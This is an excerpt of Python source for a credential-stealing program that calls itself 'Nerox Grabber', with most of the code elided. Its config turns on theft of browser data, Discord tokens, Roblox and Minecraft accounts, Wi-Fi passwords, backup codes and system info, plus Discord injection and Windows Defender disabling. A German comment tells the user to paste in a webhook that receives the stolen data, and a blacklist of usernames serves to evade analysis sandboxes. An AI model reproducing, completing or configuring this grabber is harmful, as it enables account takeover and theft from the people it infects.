...
__CONFIG__ = {'webhook': 'webhook', #Kopiere dein Webhook und Paste in hier rein!
 'ping': False, 'pingtype': 'Here', 'fakeerror': False, 'startup': False, 'defender': True, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'minecraft': True, 'wifi': True, 'killprotector': True, 'antidebug_vm': False, 'discord': True, 'anti_spam': True, 'self_destruct': False}
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "Nerox Grabber | Created By Noozq"
                    },
                    "thumbnail": {
...
class Debug:
    ...
    def checks(self):
        ...
        self.blackListedUsers = [
            ...
            'User01', 'test', 'RGzcBUyrznReg', 'Noozq']
